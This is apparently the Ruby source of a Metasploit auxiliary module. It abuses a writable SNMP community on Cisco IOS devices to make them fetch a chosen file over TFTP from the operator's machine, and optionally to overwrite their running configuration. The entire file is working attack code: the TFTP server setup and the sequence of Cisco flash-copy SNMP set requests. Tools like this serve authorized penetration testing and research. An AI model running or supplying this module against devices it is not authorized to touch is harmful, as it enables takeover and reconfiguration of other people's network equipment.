##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cisco IOS SNMP File Upload (TFTP)',
      'Description' => %q{
          This module will copy file to a Cisco IOS device using SNMP and TFTP.
        If the device is running Cisco IOS and OVERRIDE_CONFIG is set, it will
        override the running config of the device with the file that you specify.
        You can get the current running config of the device using the cisco_config_tftp module.
        A read-write SNMP community is required. The SNMP community scanner module can
        assist in identifying a read-write community. The target must
        be able to connect back to the Metasploit system and the use of
        NAT will cause the TFTP transfer to fail.
        },
      'Author'      =>
        [
          'pello <fropert[at]packetfault.org>'
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptPath.new('SOURCE', [true, "The filename to upload" ]),
      OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ]),
      OptBool.new('OVERRIDE_CONFIG', [false, 'Override the running config of Cisco device'])
    ])
  end

  #
  # Start the TFTP Server
  #
  def setup

    @path     = datastore['SOURCE']
    @filename = @path.split(/[\/\\]/)[-1] #/

    # Setup is called only once
    print_status("Starting TFTP server...")
    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })

    # Register our file name and data
    ::File.open(@path, "rb") do |fd|
      buff = fd.read(fd.stat.size)
      @tftp.register_file(@filename, buff)
    end

    @tftp.start
    add_socket(@tftp.sock)

    @main_thread = ::Thread.current

  end

  #
  # Kill the TFTP server
  #
  def cleanup
    # Cleanup is called once for every single thread
    if ::Thread.current == @main_thread
      # Wait 5 seconds for background transfers to complete
      print_status("Providing some time for transfers to complete...")
      ::IO.select(nil, nil, nil, 5.0)

      print_status("Shutting down the TFTP service...")
      if @tftp
        @tftp.close rescue nil
        @tftp = nil
      end
    end
  end

  def run_host(ip)

    begin
      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)

      ciscoFlashCopyCommand = "1.3.6.1.4.1.9.9.10.1.2.1.1.2."
      ciscoFlashCopyProtocol = "1.3.6.1.4.1.9.9.10.1.2.1.1.3."
      ciscoFlashCopyServerAddress  = "1.3.6.1.4.1.9.9.10.1.2.1.1.4."
      ciscoFlashCopySourceName = "1.3.6.1.4.1.9.9.10.1.2.1.1.5."
      ciscoFlashCopyDestinationName = "1.3.6.1.4.1.9.9.10.1.2.1.1.6."
      ciscoFlashCopyEntryStatus = "1.3.6.1.4.1.9.9.10.1.2.1.1.11."

      session = rand(255) + 1

      snmp = connect_snmp

      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(6))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(5))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ciscoFlashCopyCommand}#{session}" , SNMP::Integer.new(2))
      value = snmp.set(varbind)

      # If the above line didn't throw an error, the host is alive and the community is valid
      print_status("Copying file #{@filename} to #{ip}...")

      varbind = SNMP::VarBind.new("#{ciscoFlashCopyProtocol}#{session}" , SNMP::Integer.new(1))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ciscoFlashCopyServerAddress}#{session}", SNMP::IpAddress.new(lhost))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ciscoFlashCopySourceName}#{session}", SNMP::OctetString.new(@filename))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ciscoFlashCopyDestinationName}#{session}", SNMP::OctetString.new(@filename))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(1))
      value = snmp.set(varbind)



    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end
end
